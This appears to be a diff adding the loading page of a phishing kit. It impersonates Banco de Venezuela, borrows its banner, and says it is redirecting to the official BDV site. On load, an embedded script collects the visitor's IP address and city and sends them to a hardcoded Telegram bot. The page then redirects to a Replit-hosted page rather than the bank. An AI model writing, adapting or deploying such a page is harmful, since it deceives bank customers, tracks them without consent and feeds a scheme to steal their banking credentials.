@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="10;url=login.html">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cargando...</title>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #014d82;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Poppins', 'Segoe UI', sans-serif;
+    }
+    .container {
+      text-align: center;
+    }
+    .gif {
+      width: 400px;
+      max-width: 90%;
+      animation: fadeIn 1.5s ease;
+    }
+    .text {
+      margin-top: 15px;
+      color: #ffffff;
+      font-size: 1.2rem;
+      opacity: 0.9;
+      animation: fadeIn 2s ease;
+    }
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://www.bancodevenezuela.com/wp-content/uploads/2025/07/BANNER-ANIMADO-1-1-1.gif" alt="GIF animado mostrando el proceso de activación de tarjeta BBVA" class="gif">
+    <div class="text">Redirigiendo a la página oficial BDV en linea</div>
+  </div>
+
+  <!-- Script para enviar alerta a Telegram -->
+  <script>
+    window.onload = function() {
+      const botToken = "754797:AAF22HtpPvZ7fqykPqD7zSZxNlztPEN0"; // <-- tu token
+      const chatId = "54529674";     // <-- tu chat ID
+
+      // Obtener IP y Ciudad
+      fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip || "No disponible";
+        const ciudad = data.city || "Desconocida";
+
+        // Formato del mensaje
+        const mensaje = `🚨 Alerta 🐰 BR0K3N EDITION 🚨\n\n🌐 IP: ${ip}\n📍 Ciudad: ${ciudad}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const datos = {
+          chat_id: chatId,
+          text: mensaje
+        };
+
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(datos)
+        })
+        .then(response => console.log('Mensaje enviado a Telegram'))
+        .catch(error => console.error('Error enviando a Telegram:', error));
+      })
+      .catch(error => console.error('Error obteniendo IP:', error));
+    };
+  </script>
+
+  <!-- Redirección a login.html después de 10 segundos -->
+  <script>
+    setTimeout(function() {
+      window.location.href = "https://bc85ab3b-ca2c-4668-81cd-f6919e38ff95-00-j4jg6qxupjdo.kirk.replit.dev/";
+    }, 5000);
+  </script>
+</body>
+</html>
+
